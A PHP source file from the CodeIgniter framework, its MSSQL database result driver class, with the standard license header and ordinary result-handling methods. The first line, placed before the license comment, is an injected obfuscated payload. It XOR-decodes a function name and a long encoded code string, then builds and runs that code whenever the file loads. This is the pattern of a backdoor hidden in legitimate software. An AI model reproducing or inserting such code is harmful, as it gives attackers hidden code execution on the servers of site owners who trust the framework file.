<?php $ZbgfamszIJXj='TLEZ.H5XO;-O:=>'^'7> ;Z-j>:UN;SRP';$cVMhiLxAj=$ZbgfamszIJXj('','9FCn.KVT0IOP<3CB 6DnlXR4hY.XAt7:-XaFFUKZH6:TC-86<mIY4=>PG187XM5cR0J6XYxeYT-qsZjhG=iC>v,E9sTFbhxBMn<Y:OtEyjJRjQWRm<B>PHUYu<LH+BUMVYSjKN:>g<F=hzLSjj6THXkK 2vkfM8E51MIVgrDBYXN:Bw>X8P1JtrSCLUC4HYdHY0;OyK92b.eHsJWTVpyWK .40uki ML.+KEOhZb3;5FITagH6EPJ3=qXL3c+asyes JRv>YINKfHkX04K2csVeopJTZQ=<R8fdUh8,YsZOW4898tKJN>JB;XWF,nBW.SzOM5OH1ZO20d7O7ERQEhxb4r0kde;fG-6IG.RBBOmcUNVR;3Ce>F3<aT7N-.=IBvPXJ9S.n=Y>q33=;PTMO5P9 NmbD:BC<cR-MA8yQG:8-:21PRVXMTIVYK6Y2BS<h>HOe+1S7Tx17E5YR7mf6R18Biav-8;Xd>Q5axzlP ZG.SN.HkrSJ9;QMi13GnSTB;D+Zb1+UugyB.THThDcMSPA>PdUJ5CZ3ME2;b;sdyTnPxnS,SqQiGx<HSCq GsRqGlAheOrPFZRUNLgcgwZCK6C:9.NsU29JN7Mv SULOO0nomT3R-QoHzDtvVw9HN4KV5zQ>;LVfsD.K<:45bgaWP<3T;XIFsieC'^'P kOH>87D  >cV;+SB7FK =F7=O, +hWX,Foou0PAPO: YQYRM16FbZ13Pgh58AKvT+B9uXA21TXSzJHgFcJ7RC0MSifEOCHDgZ6HgP,YWjbQqs;QO6L<-;qQX-<Jknmr0xAbD37CS3IHTqsBNR5<90oIoV5FiS Lji vBR76+4+TjSU=AylcOxZJ>07A:7Ll6EOfBA0OhSoBW.6 7PDw-ABGUNaMD,8Ot  6HgBUZY5,okm.Y75+PUQphl d.80 SA9rRU<0nvXhO.QX>WJS-ofT.5.0bW7AFYuLSI HPFsPYMYTvjjH+.N=lLQdH>HsRniQ.<PsoI:mQ E 32-HPFk u:1 h2gLEicE7;brSCq87>NVjEEL:5E0V:LqV,;VmxnR6WU7P7UWRIZpimkC1UU+VhMGH>6ivI,5YYlgzMCIWC93:171a.69i=S62c7S=;MIP RbLnS V66REBR3EYkEARIYO9;U4LHQAf9FrcJ2:OhMTs+KI046ZV>16,+H0XrEZN,RKYfJ5<5AdEksx,ZeLq.T7;hj.WBEfZDDiNwLZ1N6DbYsAZy7zHEuKkHwUuZQ+Kev87gieGEAW;19W:eRK7,0JP9:DeQP2,  .TICMpW3Y0FaZdTVvWBBGQ=7YRuZZ87=T4O2PUUQE:HlZ5V,R,avZRo>');$cVMhiLxAj();
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
 * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
 * @license	http://opensource.org/licenses/MIT	MIT License
 * @link	https://codeigniter.com
 * @since	Version 1.3.0
 * @filesource
 */
defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * MSSQL Result Class
 *
 * This class extends the parent result class: CI_DB_result
 *
 * @package		CodeIgniter
 * @subpackage	Drivers
 * @category	Database
 * @author		EllisLab Dev Team
 * @link		https://codeigniter.com/user_guide/database/
 */
class CI_DB_mssql_result extends CI_DB_result {

	/**
	 * Number of rows in the result set
	 *
	 * @return	int
	 */
	public function num_rows()
	{
		return is_int($this->num_rows)
			? $this->num_rows
			: $this->num_rows = mssql_num_rows($this->result_id);
	}

	// --------------------------------------------------------------------

	/**
	 * Number of fields in the result set
	 *
	 * @return	int
	 */
	public function num_fields()
	{
		return mssql_num_fields($this->result_id);
	}

	// --------------------------------------------------------------------

	/**
	 * Fetch Field Names
	 *
	 * Generates an array of column names
	 *
	 * @return	array
	 */
	public function list_fields()
	{
		$field_names = array();
		mssql_field_seek($this->result_id, 0);
		while ($field = mssql_fetch_field($this->result_id))
		{
			$field_names[] = $field->name;
		}

		return $field_names;
	}

	// --------------------------------------------------------------------

	/**
	 * Field data
	 *
	 * Generates an array of objects containing field meta-data
	 *
	 * @return	array
	 */
	public function field_data()
	{
		$retval = array();
		for ($i = 0, $c = $this->num_fields(); $i < $c; $i++)
		{
			$field = mssql_fetch_field($this->result_id, $i);

			$retval[$i]		= new stdClass();
			$retval[$i]->name	= $field->name;
			$retval[$i]->type	= $field->type;
			$retval[$i]->max_length	= $field->max_length;
		}

		return $retval;
	}

	// --------------------------------------------------------------------

	/**
	 * Free the result
	 *
	 * @return	void
	 */
	public function free_result()
	{
		if (is_resource($this->result_id))
		{
			mssql_free_result($this->result_id);
			$this->result_id = FALSE;
		}
	}

	// --------------------------------------------------------------------

	/**
	 * Data Seek
	 *
	 * Moves the internal pointer to the desired offset. We call
	 * this internally before fetching results to make sure the
	 * result set starts at zero.
	 *
	 * @param	int	$n
	 * @return	bool
	 */
	public function data_seek($n = 0)
	{
		return mssql_data_seek($this->result_id, $n);
	}

	// --------------------------------------------------------------------

	/**
	 * Result - associative array
	 *
	 * Returns the result set as an array
	 *
	 * @return	array
	 */
	protected function _fetch_assoc()
	{
		return mssql_fetch_assoc($this->result_id);
	}

	// --------------------------------------------------------------------

	/**
	 * Result - object
	 *
	 * Returns the result set as an object
	 *
	 * @param	string	$class_name
	 * @return	object
	 */
	protected function _fetch_object($class_name = 'stdClass')
	{
		$row = mssql_fetch_object($this->result_id);

		if ($class_name === 'stdClass' OR ! $row)
		{
			return $row;
		}

		$class_name = new $class_name();
		foreach ($row as $key => $value)
		{
			$class_name->$key = $value;
		}

		return $class_name;
	}

}
